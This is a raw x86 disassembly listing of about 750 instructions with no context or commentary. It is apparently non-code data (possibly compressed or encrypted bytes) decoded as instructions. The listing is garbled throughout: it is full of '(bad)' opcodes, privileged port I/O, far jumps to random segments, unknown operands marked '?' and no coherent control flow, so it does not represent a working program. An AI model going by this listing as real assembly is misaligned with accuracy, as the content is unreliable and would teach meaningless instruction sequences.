  411fae:	adc    ah,BYTE PTR [eax+0x71fc41ec]
  411fb4:	ret    0xadbb
  411fb7:	mov    cl,0xc5
  411fb9:	xchg   DWORD PTR [ebx+ebp*1-0x56e436bf],edx
  411fc0:	sbb    ch,bl
  411fc2:	fsubr  DWORD PTR [ecx-0x5217a67a]
  411fc8:	sub    eax,0x621b7259
  411fcd:	xchg   DWORD PTR [ebx],edx
  411fcf:	lods   eax,DWORD PTR ds:[esi]
  411fd0:	out    dx,eax
  411fd1:	xchg   BYTE PTR [ebx+0x7446c815],dl
  411fd7:	popf   
  411fd8:	inc    ebx
  411fd9:	sti    
  411fda:	mov    esi,0x34f44dd4
  411fdf:	out    0x87,eax
  411fe1:	repnz dec esi
  411fe3:	cmp    BYTE PTR [edi-0x2d],ah
  411fe6:	(bad)  
  411fe8:	mov    ebx,0xfb3d46d6
  411fed:	xchg   edi,eax
  411fee:	repz mov edx,es
  411ff1:	dec    ebp
  411ff2:	pop    esp
  411ff3:	clc    
  411ff4:	lds    ecx,FWORD PTR [esi]
  411ff6:	cmp    BYTE PTR ds:0x55736729,dl
  411ffc:	loopne 0x412048
  411ffe:	nop
  411fff:	or     dl,dl
  412001:	xlat   BYTE PTR ds:[ebx]
  412002:	std    
  412003:	gs stos DWORD PTR es:[di],eax
  412006:	into   
  412007:	(bad)  
  412008:	rcr    DWORD PTR [ecx+ecx*4-0x6db2bad],1
  41200f:	push   edx
  412010:	cli    
  412011:	in     eax,0x81
  412013:	inc    ebp
  412014:	sub    eax,0x4cfc3909
  412019:	mov    al,0xec
  41201b:	mov    eax,0xe73141ab
  412020:	dec    edx
  412021:	retf   
  412022:	or     eax,0x70b641bc
  412027:	lods   eax,DWORD PTR ds:[esi]
  412028:	and    DWORD PTR [esi],ebp
  41202a:	repz aam 0x8e
  41202d:	or     esp,DWORD PTR [esi+esi*2]
  412030:	add    DWORD PTR [eax+0x7f4ac2b8],edx
  412036:	sbb    ch,dh
  412038:	jbe    0x412082
  41203a:	inc    edi
  41203b:	pushf  
  41203c:	jge    0x411fe8
  41203e:	jne    0x4120ae
  412040:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412041:	(bad)  
  412042:	ror    BYTE PTR [esi+0x39],0x9a
  412046:	lods   al,BYTE PTR ds:[esi]
  412047:	pop    edx
  412048:	add    BYTE PTR [eax+0x4500afe6],dh
  41204e:	jmp    0x6ba44cc0
  412053:	push   edx
  412054:	cld    
  412055:	je     0x4120d6
  412057:	pop    ss
  412058:	int3   
  412059:	ficom  DWORD PTR [edx+eiz*4]
  41205c:	cwde   
  41205d:	inc    esi
  41205e:	hlt    
  41205f:	jle    0x411fed
  412061:	and    DWORD PTR [ebx-0x79],edi
  412064:	inc    edx
  412065:	sbb    esp,DWORD PTR cs:[edi-0x612e244a]
  41206c:	dec    BYTE PTR [eax+0x32]
  41206f:	xchg   edi,eax
  412070:	stos   BYTE PTR es:[edi],al
  412071:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412072:	in     eax,dx
  412073:	dec    ebp
  412074:	enter  0xd8dc,0x12
  412078:	jmp    0x412057
  41207a:	or     al,0x2d
  41207c:	pop    ebx
  41207d:	inc    edx
  41207e:	xlat   BYTE PTR ds:[ebx]
  41207f:	sbb    edi,edx
  412081:	adc    cl,BYTE PTR [ecx+0x6c]
  412084:	adc    cl,BYTE PTR [eax-0x3345e894]
  41208a:	jbe    0x412089
  41208c:	icebp  
  41208d:	outs   dx,BYTE PTR ds:[esi]
  41208e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41208f:	ins    BYTE PTR es:[edi],dx
  412090:	adc    DWORD PTR ds:0x7e2ad4ce,eax
  412096:	push   ebx
  412097:	shr    edi,1
  412099:	out    0xf9,al
  41209b:	(bad)  
  41209e:	adc    esp,ebp
  4120a0:	stos   BYTE PTR es:[edi],al
  4120a1:	repnz mov ?,WORD PTR [ebx+0x2d]
  4120a5:	ds jno 0x41206d
  4120a8:	movzx  esp,dh
  4120ab:	in     al,0x7
  4120ad:	pop    ecx
  4120ae:	iret   
  4120af:	xor    esi,DWORD PTR [ebp-0x66]
  4120b2:	or     ebx,esp
  4120b4:	mov    esp,0x4ebb45d
  4120b9:	dec    ebp
  4120ba:	xor    ch,dh
  4120bc:	cmp    edi,DWORD PTR [ebx]
  4120be:	bound  esp,QWORD PTR [ecx-0x6aaeac03]
  4120c4:	sub    DWORD PTR [ebx],ebx
  4120c6:	xchg   ebp,eax
  4120c7:	stos   BYTE PTR es:[edi],al
  4120c8:	sub    dh,dl
  4120ca:	fst    st(5)
  4120cc:	scas   eax,DWORD PTR es:[edi]
  4120cd:	mov    ebx,DWORD PTR [ebp-0x57af5a27]
  4120d3:	jno    0x412090
  4120d5:	sahf   
  4120d6:	repnz hlt 
  4120d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120d9:	stos   BYTE PTR es:[edi],al
  4120da:	stc    
  4120db:	rcl    dl,0x54
  4120de:	mov    ebp,0x1890d1a2
  4120e3:	hlt    
  4120e4:	int3   
  4120e5:	in     eax,0xbc
  4120e7:	imul   ebx,ecx,0xffffff8b
  4120ea:	xchg   ecx,eax
  4120eb:	nop/reserved BYTE PTR [esi]
  4120ee:	adc    BYTE PTR [esi+eax*1+0x59],dl
  4120f2:	jnp    0x4120f3
  4120f4:	push   0xdc6090dd
  4120f9:	data16 ss cmp dh,ch
  4120fd:	mov    ebx,0x9c2d4a0c
  412102:	call   0x3dcf3c63
  412107:	push   eax
  412108:	aaa    
  412109:	inc    ebx
  41210a:	outs   dx,BYTE PTR ds:[esi]
  41210b:	icebp  
  41210c:	dec    ebx
  41210d:	sahf   
  41210e:	sub    BYTE PTR [eax],dh
  412110:	mov    ?,WORD PTR [edi+edi*8+0x50]
  412114:	add    BYTE PTR [ecx-0x1],bh
  412117:	cmp    al,0xf4
  412119:	inc    esp
  41211a:	repnz repnz adc ecx,DWORD PTR [esi]
  41211e:	jno    0x41213e
  412120:	sti    
  412121:	dec    esi
  412122:	rol    DWORD PTR [ecx-0x27],cl
  412125:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412126:	dec    eax
  412127:	sbb    esp,DWORD PTR [edx]
  412129:	lds    ecx,FWORD PTR [edi+0x621f32a5]
  41212f:	daa    
  412130:	pop    ecx
  412131:	pusha  
  412132:	and    ebx,DWORD PTR [esi-0x2cda034c]
  412138:	pop    esp
  412139:	ins    DWORD PTR es:[edi],dx
  41213a:	leave  
  41213b:	inc    ecx
  41213c:	jp     0x4120e4
  41213e:	push   esi
  41213f:	push   ebp
  412140:	xor    eax,0xbdb9491f
  412145:	adc    eax,0x8318a466
  41214a:	mov    ah,bl
  41214c:	pop    di
  41214e:	xor    BYTE PTR [ebp+ebp*2-0x555120b8],cl
  412155:	repnz pop ecx
  412157:	jg     0x41214c
  412159:	or     dh,ch
  41215b:	imul   eax,DWORD PTR [esi],0xffffffff
  41215e:	mov    bh,0x8a
  412160:	inc    edi
  412161:	leave  
  412162:	mov    ebp,0x55e2d9e3
  412167:	or     esp,ebx
  412169:	jae    0x4121a4
  41216b:	jb     0x412119
  41216d:	mov    edi,0x7af4bcc9
  412172:	dec    edi
  412173:	inc    edx
  412174:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412175:	push   esp
  412176:	fsubr  QWORD PTR [ecx]
  412178:	xor    eax,0x83470587
  41217d:	aad    0xe8
  41217f:	nop
  412180:	sub    eax,0x61b4ecd2
  412185:	add    dh,BYTE PTR [ebx]
  412187:	and    BYTE PTR [ebp-0x5e4e73fd],cl
  41218d:	sti    
  41218e:	pop    esp
  41218f:	(bad)  
  412190:	outs   dx,DWORD PTR ds:[esi]
  412191:	lock pop esi
  412193:	in     eax,0x26
  412195:	mov    bl,0x29
  412197:	cli    
  412198:	(bad)  
  412199:	cld    
  41219a:	dec    ecx
  41219b:	pop    ecx
  41219c:	xor    eax,0xc6e50a2e
  4121a1:	xchg   ecx,eax
  4121a2:	dec    ecx
  4121a3:	add    ecx,ecx
  4121a5:	mov    edx,0x1e0f9943
  4121aa:	xchg   ecx,eax
  4121ab:	les    eax,FWORD PTR [edx+0x4c]
  4121ae:	inc    esp
  4121af:	mov    bl,BYTE PTR [ebp+0xf]
  4121b2:	jb     0x4121fd
  4121b4:	push   cs
  4121b5:	xor    al,ah
  4121b7:	leave  
  4121b8:	jle    0x412154
  4121ba:	jmp    0x41213d
  4121bc:	mov    al,ds:0xe67f6dab
  4121c1:	fldenv [ebx]
  4121c3:	aaa    
  4121c4:	inc    eax
  4121c5:	push   edx
  4121c6:	push   0x69d94e34
  4121cb:	jle    0x412206
  4121cd:	sub    eax,0x7320cf70
  4121d2:	rcr    BYTE PTR [edi],0x16
  4121d5:	cmp    ch,BYTE PTR [edx]
  4121d7:	push   ebx
  4121d8:	dec    esi
  4121d9:	aad    0x7
  4121db:	(bad)  
  4121dc:	mov    esi,0x9f679921
  4121e1:	sar    DWORD PTR [eax-0x4a],cl
  4121e4:	jp     0x412170
  4121e6:	and    eax,0xf0c6439f
  4121eb:	fdivr  DWORD PTR [esi+eax*4-0x888adbd]
  4121f2:	in     eax,0xe8
  4121f4:	fnstcw WORD PTR [eax-0x7c1ff949]
  4121fa:	outs   dx,DWORD PTR ds:[esi]
  4121fb:	daa    
  4121fc:	lea    esi,[esi]
  4121fe:	or     al,0x33
  412200:	jo     0x4121cc
  412202:	out    0x54,al
  412204:	out    0xfd,eax
  412206:	mov    dl,0xe2
  412208:	sbb    al,0xa8
  41220a:	adc    al,0x7
  41220c:	inc    eax
  41220d:	or     eax,0xd80fc8e0
  412212:	mov    cl,0xbf
  412214:	shl    BYTE PTR [esi],1
  412216:	stos   DWORD PTR es:[edi],eax
  412217:	mov    esi,0xf127bffa
  41221c:	sbb    al,0xdc
  41221e:	xchg   edx,eax
  41221f:	pop    esp
  412220:	add    al,0x19
  412222:	dec    eax
  412223:	in     eax,dx
  412224:	push   cs
  412225:	push   ebp
  412226:	pop    ss
  412227:	call   DWORD PTR [ecx+0x21]
  41222a:	lods   eax,DWORD PTR ds:[esi]
  41222b:	mov    BYTE PTR [eax+0x4b],ch
  41222e:	jecxz  0x4121e4
  412230:	jmp    0xb3b49ee0
  412235:	mov    bh,0x95
  412237:	jmp    FWORD PTR [ecx]
  412239:	loope  0x4122a3
  41223b:	gs dec esp
  41223d:	pop    edx
  41223e:	fxch   st(3)
  412240:	into   
  412241:	test   al,0xba
  412243:	ds pop ss
  412245:	xor    al,0xca
  412247:	pop    eax
  412248:	inc    edx
  412249:	aad    0xc3
  41224b:	adc    ebp,edi
  41224d:	mov    ecx,0x2881b8f
  412252:	ss xchg ecx,eax
  412254:	add    eax,0xc8f3c3fd
  412259:	in     al,0x8e
  41225b:	retf   
  41225c:	rcl    BYTE PTR [ebx-0x79],0x8a
  412260:	lea    ebp,[ecx+0x16]
  412263:	repz test BYTE PTR [ebp+0x56dac304],dl
  41226a:	lahf   
  41226b:	pop    ecx
  41226c:	je     0x412287
  41226e:	xchg   eax,eax
  412270:	mov    eax,ds:0xa646fbc4
  412275:	fmulp  st(6),st
  412277:	into   
  412278:	mov    ds:0x70ab5792,al
  41227d:	and    eax,esp
  41227f:	sti    
  412280:	push   es
  412281:	sub    eax,0x9ca9eb8d
  412286:	clc    
  412287:	ins    DWORD PTR es:[edi],dx
  412288:	jle    0x412289
  41228a:	aas    
  41228b:	fcomp  DWORD PTR [edx+0x2f]
  41228e:	push   ss
  41228f:	inc    ecx
  412290:	xor    al,ah
  412292:	pop    edi
  412293:	(bad)  
  412294:	leave  
  412295:	mov    bh,0x28
  412297:	loopne 0x4122b7
  412299:	mov    bh,0x60
  41229b:	outs   dx,BYTE PTR ds:[esi]
  41229c:	add    BYTE PTR [edi],dl
  41229e:	rcl    BYTE PTR [ebp+0x62858a7],0x6f
  4122a5:	or     ch,dl
  4122a7:	adc    BYTE PTR [bx-0x6e39],dh
  4122ac:	in     al,dx
  4122ad:	xor    ah,bh
  4122af:	outs   dx,DWORD PTR ds:[esi]
  4122b0:	ins    DWORD PTR es:[edi],dx
  4122b1:	fbld   TBYTE PTR [ebx+0x6c]
  4122b4:	xchg   ecx,eax
  4122b5:	outs   dx,DWORD PTR ds:[esi]
  4122b6:	call   0x7538:0xb32fa9ff
  4122bd:	lahf   
  4122be:	pop    ecx
  4122bf:	in     al,dx
  4122c0:	sahf   
  4122c1:	scas   eax,DWORD PTR es:[edi]
  4122c2:	add    BYTE PTR [edi-0x481ca001],ch
  4122c8:	adc    BYTE PTR [eax+0x8],dl
  4122cb:	xchg   esi,eax
  4122cc:	inc    esi
  4122cd:	clc    
  4122ce:	mov    edi,0xbcee507b
  4122d3:	adc    BYTE PTR [edi+0x7af0af17],ch
  4122d9:	dec    eax
  4122da:	and    bl,bl
  4122dc:	mov    ah,0x50
  4122de:	pop    edx
  4122df:	cli    
  4122e0:	and    eax,DWORD PTR [ebx]
  4122e2:	fwait
  4122e3:	xchg   esi,eax
  4122e4:	test   al,0x44
  4122e6:	std    
  4122e7:	ret    0x15fa
  4122ea:	daa    
  4122eb:	cmp    eax,0xad484304
  4122f0:	rol    DWORD PTR [eax],1
  4122f2:	sbb    eax,0x8697a894
  4122f7:	test   DWORD PTR [esi-0x37],esp
  4122fa:	icebp  
  4122fb:	retf   
  4122fc:	aaa    
  4122fd:	mov    bl,0x5
  4122ff:	ins    DWORD PTR es:[edi],dx
  412300:	mov    ebp,0x9d12b442
  412305:	popa   
  412306:	add    BYTE PTR [eax-0x17950c9b],0x34
  41230d:	loop   0x41238b
  41230f:	mov    eax,ds:0x516900c
  412314:	(bad)  
  412315:	jmp    0xadbd:0x48249ba8
  41231c:	popf   
  41231d:	adc    eax,0x92e7ac8
  412322:	adc    BYTE PTR [edi-0x6],0x4c
  412326:	ret    
  412327:	mov    eax,ds:0x80f7b998
  41232c:	shr    BYTE PTR [eax],cl
  41232e:	cs sahf 
  412330:	adc    cl,bh
  412332:	dec    ebx
  412333:	mov    edx,0xfaf68209
  412338:	cwde   
  412339:	or     edi,DWORD PTR [edi]
  41233b:	enter  0x885b,0xc8
  41233f:	mov    eax,ds:0xc700824e
  412344:	pushf  
  412345:	jne    0x412371
  412347:	shr    BYTE PTR [ebp-0x58],0xa5
  41234b:	mov    esp,0xd0b48be6
  412350:	sub    eax,0xc7b8e44c
  412355:	mov    edi,0x11947bc
  41235a:	in     eax,dx
  41235b:	dec    ecx
  41235c:	mov    edx,esp
  41235e:	sub    bh,dl
  412360:	loopne 0x41232c
  412362:	lods   eax,DWORD PTR ds:[esi]
  412363:	loope  0x412314
  412365:	sar    ebx,cl
  412367:	retf   0x5de4
  41236a:	clc    
  41236b:	xchg   DWORD PTR [ecx],edx
  41236d:	jo     0x412396
  41236f:	sahf   
  412370:	sbb    eax,0xbc0a3fc5
  412375:	adc    BYTE PTR [edx+0x1f],0x37
  412379:	push   0x7c
  41237b:	repz leave 
  41237d:	(bad)  
  41237e:	arpl   WORD PTR [edi],cx
  412380:	(bad)  
  412381:	cli    
  412382:	cmc    
  412383:	fsubrp st(7),st
  412385:	out    dx,al
  412386:	cmp    ebp,DWORD PTR [edi+0x78611faf]
  41238c:	pop    eax
  41238d:	pop    ebx
  41238e:	mov    cl,0x1a
  412390:	sub    eax,0x27144392
  412395:	pop    edi
  412396:	iret   
  412397:	mov    bh,0x11
  412399:	cdq    
  41239a:	or     ebx,0x8
  41239d:	push   0x73729b49
  4123a2:	sub    eax,0x9fa704dd
  4123a7:	mov    al,ds:0x1b10db24
  4123ac:	inc    ecx
  4123ad:	fisubr WORD PTR [ebx-0x60fd6f9]
  4123b3:	les    esp,FWORD PTR [edx+0x4293a8ba]
  4123b9:	add    BYTE PTR [ebx+0x73],al
  4123bc:	push   esp
  4123bd:	fdivr  QWORD PTR [eax-0xeb0d44f]
  4123c3:	retf   
  4123c4:	mov    al,ds:0xbb59e4a5
  4123c9:	xchg   DWORD PTR [esi-0x2483088],edi
  4123cf:	in     al,dx
  4123d0:	push   cs
  4123d1:	fmulp  st(7),st
  4123d3:	fcom   QWORD PTR [eax-0x3f]
  4123d6:	loope  0x41241d
  4123d8:	adc    BYTE PTR [edi+0xf],dl
  4123db:	and    DWORD PTR [eax],esp
  4123dd:	(bad)  
  4123de:	and    BYTE PTR [ebx+edi*8-0x7a],dh
  4123e2:	xchg   edi,eax
  4123e3:	inc    edi
  4123e4:	mov    eax,0xb5baa77f
  4123e9:	mul    BYTE PTR [edx]
  4123eb:	sbb    al,0x1d
  4123ed:	sbb    dh,BYTE PTR [edi+0xb]
  4123f0:	out    dx,eax
  4123f1:	xor    edx,esi
  4123f3:	mov    esi,DWORD PTR [eax+ecx*8]
  4123f6:	push   esi
  4123f7:	rcl    ch,1
  4123f9:	in     al,0x3c
  4123fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123fc:	ret    
  4123fd:	sbb    BYTE PTR [eax+0x7341a29d],al
  412403:	cld    
  412404:	push   edx
  412405:	sbb    DWORD PTR [ebp-0x78e8c4a],ebp
  41240b:	lahf   
  41240c:	xor    BYTE PTR [ebx+0x3d63827c],cl
  412412:	adc    ebp,DWORD PTR [edi-0x49]
  412415:	push   esi
  412416:	mov    WORD PTR [ecx-0x29f28bb8],?
  41241c:	xchg   esi,eax
  41241d:	sub    ebx,DWORD PTR [ecx]
  41241f:	(bad)  
  412420:	jecxz  0x412499
  412422:	xlat   BYTE PTR ds:[ebx]
  412423:	mov    cl,0x6e
  412425:	sub    al,0x9a
  412427:	jne    0x412439
  412429:	into   
  41242a:	retf   
  41242b:	popa   
  41242c:	iret   
  41242d:	ins    DWORD PTR es:[edi],dx
  41242e:	sub    DWORD PTR [edx-0xf],0x59577ea9
  412435:	pop    edx
  412436:	mov    ch,0x15
  412438:	sub    al,0xfd
  41243a:	out    dx,al
  41243b:	ficomp DWORD PTR [ebx+0x6a8b61bc]
  412441:	mov    dl,0xa4
  412443:	jge    0x4123d5
  412445:	call   0xcd58:0x469e2b7c
  41244c:	ret    0x29f6
  41244f:	adc    dl,BYTE PTR [edi-0x3171f06a]
  412455:	mov    ebx,0xfae3eddd
  41245a:	and    BYTE PTR ds:0x13b8c666,dh
  412460:	daa    
  412461:	stos   DWORD PTR es:[edi],eax
  412462:	push   eax
  412463:	or     BYTE PTR [edx-0x51eb5a5d],ah
  412469:	sahf   
  41246a:	and    BYTE PTR [ecx+0x14],dl
  41246d:	stc    
  41246e:	leave  
  41246f:	adc    DWORD PTR [ecx+0xa],edx
  412472:	ds inc esi
  412474:	xchg   ebp,eax
  412475:	les    esi,FWORD PTR [ecx+esi*8]
  412478:	out    0x7a,al
  41247a:	data16 and bh,ah
  41247d:	mov    ebx,0x44371b02
  412482:	cmp    DWORD PTR [eax],ebp
  412484:	mov    dl,0x88
  412486:	jmp    0x919c:0xd00754bf
  41248d:	call   0x8ebefb7b
  412492:	call   0x7f7c:0x27247df3
  412499:	ss mov ch,0x85
  41249c:	push   0x5c
  41249e:	adc    BYTE PTR [eax-0x1a3b5dde],ah
  4124a4:	mov    ebx,0x152045d9
  4124a9:	ss in  eax,0x49
  4124ac:	ds (bad) 
  4124ae:	sub    esi,esi
  4124b0:	(bad)  
  4124b1:	(bad)  
  4124b2:	jae    0x4124e5
  4124b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124b5:	pop    eax
  4124b6:	mov    eax,ebx
  4124b8:	mov    dh,0x19
  4124ba:	xchg   ebp,eax
  4124bb:	fadd   DWORD PTR [eax]
  4124bd:	jmp    0x412516
  4124bf:	or     esi,ecx
  4124c1:	push   ds
  4124c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124c3:	mov    al,BYTE PTR [eax]
  4124c5:	(bad)
  4124c8:	xor    al,0xc8
  4124ca:	mov    bl,0x1c
  4124cc:	mov    eax,ds:0xb1feeafc
  4124d1:	stc    
  4124d2:	xchg   BYTE PTR [ebx+0x4a],bh
  4124d5:	pop    edx
  4124d6:	mov    edx,0x9e4ab03c
  4124db:	xchg   esp,eax
  4124dc:	jg     0x41251e
  4124de:	push   ss
  4124df:	xor    eax,ecx
  4124e1:	je     0x4124bf
  4124e3:	mov    dl,0x4b
  4124e5:	mov    al,0x2b
  4124e7:	ds push ecx
  4124e9:	aam    0x17
  4124eb:	cmp    al,0x15
  4124ed:	shl    BYTE PTR [eax+0x5d9a5835],1
  4124f3:	add    al,BYTE PTR [ecx-0x5]
  4124f6:	mov    ?,WORD PTR [ebx-0x690f69b6]
  4124fc:	fs (bad) 
  4124fe:	mov    dl,0xac
  412500:	mov    al,ds:0x5a0de0db
  412505:	bound  ecx,QWORD PTR [edx]
  412507:	ret    0x8d6e
  41250a:	aam    0x24
  41250c:	lds    esi,FWORD PTR [ecx+0x3f]
  41250f:	dec    eax
  412510:	jg     0x41258a
  412512:	xor    DWORD PTR [edx],esp
  412514:	ss or  BYTE PTR cs:[si+0x34],ch
  41251a:	in     eax,dx
  41251b:	xchg   edi,eax
  41251c:	cs stc 
  41251e:	jl     0x412589
  412520:	adc    eax,0x401d2bdb
  412525:	mov    ds:0x17c72f43,eax
  41252a:	into   
  41252b:	stos   BYTE PTR es:[edi],al
  41252c:	mov    ebx,0xa97bc73b
  412531:	fs push eax
  412533:	ficom  DWORD PTR [ecx-0x75]
  412536:	cmp    eax,DWORD PTR [esi-0x66da43ea]
  41253c:	cld    
  41253d:	(bad)  
  41253e:	(bad)  
  41253f:	sub    DWORD PTR ds:0xe1f5dcb8,0x8683c29b
  412549:	mov    bl,0x58
  41254b:	(bad)  
  41254c:	or     BYTE PTR [edx-0x5e204b48],cl
  412552:	retf   
  412553:	push   edi
  412554:	push   edx
  412555:	test   al,0xcd
  412557:	inc    ebx
  412558:	outs   dx,DWORD PTR ds:[esi]
  412559:	jge    0x412507
  41255b:	jmp    0xb18e5320
  412560:	and    esp,DWORD PTR [ebx+ecx*4]
  412563:	fld    QWORD PTR [eax+edx*2-0x33]
  412567:	xlat   BYTE PTR ds:[ebx]
  412568:	cld    
  412569:	dec    BYTE PTR [ebx+0x239b9b25]
  41256f:	sti    
  412570:	xor    al,0xe4
  412572:	xlat   BYTE PTR ds:[ebx]
  412573:	clc    
  412574:	ss pop edx
  412576:	xchg   ebx,eax
  412577:	mov    cl,0xdd
  412579:	mov    al,ds:0xb4a2d1c3
  41257e:	add    cl,BYTE PTR [edx+0x74]
  412581:	mov    DWORD PTR ss:[edx],esi
  412584:	add    DWORD PTR [eax+0x7ca115d6],ebx
  41258a:	sub    DWORD PTR [ebx],eax
  41258c:	scas   eax,DWORD PTR es:[edi]
  41258d:	popf   
  41258e:	and    eax,0xe51973d5
  412593:	mov    WORD PTR [edi],fs
  412595:	push   0xffffffa8
  412597:	imul   eax,DWORD PTR ss:[edi],0x3b
  41259b:	fisttp WORD PTR [edx+0x42]
  41259e:	push   0x25
  4125a0:	jbe    0x4125c9
  4125a2:	mov    bh,BYTE PTR [ebx]
  4125a4:	enter  0x5bf0,0x85
  4125a8:	inc    esi
  4125a9:	pop    ss
  4125aa:	dec    ebp
  4125ab:	add    eax,0x1b05e029
  4125b0:	cld    
  4125b1:	pop    edi
  4125b2:	mov    bh,0x92
  4125b4:	mov    bh,0xa5
  4125b6:	add    DWORD PTR [ebp-0x2e],0xccace941
  4125bd:	out    0x81,eax
  4125bf:	xchg   bl,bl
  4125c1:	stos   BYTE PTR es:[edi],al
  4125c2:	dec    ebp
  4125c3:	adc    BYTE PTR [edi+ebx*2],ah
  4125c6:	cmp    edx,DWORD PTR [eax-0x58f44d3a]
  4125cc:	jno    0x4125fa
  4125ce:	aam    0x67
  4125d0:	scas   al,BYTE PTR es:[edi]
  4125d1:	push   ss
  4125d2:	pop    edx
  4125d3:	push   ds
  4125d4:	js     0x41261a
  4125d6:	dec    esp
  4125d7:	adc    DWORD PTR [edi],ebx
  4125d9:	adc    ebx,ebx
  4125db:	in     al,0xd4
  4125dd:	add    eax,0x340931c2
  4125e2:	outs   dx,BYTE PTR ds:[esi]
  4125e3:	push   0x4abdce00
  4125e8:	jo     0x412623
  4125ea:	mov    bl,0x96
  4125ec:	(bad)  
  4125ed:	cmp    DWORD PTR [ecx+eiz*8-0x15],eax
  4125f1:	mov    ch,0x60
  4125f3:	out    dx,eax
  4125f4:	adc    DWORD PTR [edi],ebp
  4125f6:	sub    al,0x8d
  4125f8:	mov    cs,WORD PTR ds:[ebp-0x59]
  4125fc:	and    al,0x7f
  4125fe:	dec    esi
  4125ff:	xchg   edx,eax
  412600:	xchg   DWORD PTR [edi],ebx
  412602:	xor    eax,0x3f00cb4e
  412607:	adc    DWORD PTR [edi+0x42],esp
  41260a:	xor    al,al
  41260c:	or     dh,BYTE PTR [eax]
  41260e:	or     ebx,ecx
  412610:	sbb    al,BYTE PTR ds:0x597ac65
  412616:	mov    edx,0x9c4bddc4
  41261b:	cli    
  41261c:	call   0x847d7bfc
  412621:	push   esp
  412622:	xchg   ebx,eax
  412623:	cmp    BYTE PTR [ecx+0x1f],bh
  412626:	retf   0x9641
  412629:	or     DWORD PTR [ecx+0x16],0x6e4fa6aa
  412630:	jp     0x412694
  412632:	enter  0xe501,0xf1
  412636:	cmp    al,0x66
  412638:	imul   edx,DWORD PTR [ecx-0x1dff6bb8],0xffffffe6
  41263f:	cmp    DWORD PTR [edi+edi*4],edi
  412642:	sub    eax,esp
  412644:	add    eax,0x967a20d4
  412649:	xor    BYTE PTR [ebp+0x387555a5],ah
  41264f:	xchg   edx,eax
  412650:	shl    edx,1
  412652:	lods   eax,DWORD PTR ds:[esi]
  412653:	inc    ebx
  412654:	mov    edi,0xa0e49665
  412659:	cmp    al,0xcd
  41265b:	sub    al,0x93
  41265d:	sahf   
  41265e:	imul   ebp,esi,0xef40d43b
  412664:	in     al,0x9c
  412666:	cmp    dl,BYTE PTR [edi+0x7297d0c6]
  41266c:	mov    ds:0xee3ca52b,eax
  412671:	cwde   
  412672:	hlt    
  412673:	ret    0x438
  412676:	jnp    0x4126d3
  412678:	sar    BYTE PTR [eax-0x55],0xe
  41267c:	mov    esp,DWORD PTR [ebp-0x37]
  41267f:	cdq    
  412680:	fwait
  412681:	mov    BYTE PTR [eax],ch
  412683:	mov    esi,0x2e585aae
  412688:	pop    es
  412689:	inc    ecx
  41268a:	add    DWORD PTR [edx-0x35],ebp
  41268d:	xlat   BYTE PTR ds:[ebx]
  41268e:	rcl    DWORD PTR [edi+0x3],0x16
  412692:	mov    esi,0xdb0be524
  412697:	jle    0x41265c
  412699:	mov    eax,ds:0x275e639b
  41269e:	mov    dh,BYTE PTR [ecx-0x2631882e]
  4126a4:	int    0x48
  4126a6:	call   0x1646:0xf9446a85
  4126ad:	add    BYTE PTR [esi],0x63
  4126b0:	rol    cl,1
  4126b2:	pop    edi
  4126b3:	push   ds
  4126b4:	mov    al,ds:0x7af474db
  4126b9:	das    
  4126ba:	lods   eax,DWORD PTR ds:[esi]
  4126bb:	rol    DWORD PTR [ebp+0x1a3bbe54],cl
  4126c1:	mov    esp,0xedfb2bdd
  4126c6:	jg     0x412727
  4126c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126c9:	push   ss
  4126ca:	cmp    eax,0x2ff8c647
  4126cf:	cmp    al,0x1a
  4126d1:	jnp    0x412738
  4126d3:	shr    esp,1
  4126d5:	out    dx,eax
  4126d6:	ds cld 
  4126d8:	xchg   esp,edi
  4126da:	jae    0x412737
  4126dc:	dec    eax
  4126dd:	imul   edi,DWORD PTR [edx+ebx*1],0x9737c04c
  4126e4:	inc    esi
  4126e5:	mov    dl,0xd7
  4126e7:	leave  
  4126e8:	popa   
  4126e9:	out    dx,eax
  4126ea:	stos   BYTE PTR es:[edi],al
  4126eb:	mov    bh,BYTE PTR [ebx+0x6d82206f]
  4126f1:	aad    0x2b
  4126f3:	fwait
  4126f4:	or     BYTE PTR [edx+0x3b6db078],ch
  4126fa:	nop
  4126fb:	inc    ebp
  4126fc:	sbb    bl,BYTE PTR [eax+0x170a74cf]
  412702:	sbb    cl,ch
  412704:	int3   
  412705:	add    al,0xea
  412707:	loop   0x412779
  412709:	aam    0xf6
  41270b:	or     al,bl
  41270d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41270e:	or     DWORD PTR [ebx-0x697da9ac],ebx
  412714:	sar    bl,cl
  412716:	bound  edx,QWORD PTR [ebx+0x71ccf7ad]
  41271c:	mov    ebp,0x46bfbc3
  412721:	mov    eax,0x90cb5437
  412726:	je     0x412765
  412728:	xchg   esp,eax
  412729:	jbe    0x4126df
  41272b:	aaa    
  41272c:	lods   al,BYTE PTR ds:[esi]
  41272d:	ja     0x412788
  41272f:	or     BYTE PTR [edx],bl
  412731:	sahf   
  412732:	and    BYTE PTR [ebp-0x64],cl
  412735:	or     BYTE PTR [ebx-0x639430d1],0x4f
  41273c:	sbb    al,0x98
  41273e:	xor    bh,BYTE PTR [ebx]
  412740:	outs   dx,DWORD PTR ds:[esi]
  412741:	cdq    
  412742:	mov    dl,0xfa
  412744:	das    
  412745:	or     dh,dl
  412747:	movsx  eax,WORD PTR [esi+0x27]
  41274b:	pushf  
  41274c:	mov    ebx,0xac32f31f
  412751:	(bad)  
  412753:	jmp    FWORD PTR [esi+0x53]
  412756:	cmp    edx,0xfffffffd
  412759:	sahf   
  41275a:	cmp    dh,cl
  41275c:	jnp    0x41272f
  41275e:	jge    0x4127a9
  412760:	mov    dl,BYTE PTR [ebx+0x49]
  412763:	pop    ds
  412764:	xchg   BYTE PTR [eax-0x26],al
  412767:	pop    ebp
  412768:	dec    ebp
  412769:	imul   edx,DWORD PTR [edx+0x63],0x37fc6f34
  412770:	(bad)  
  412772:	aaa    
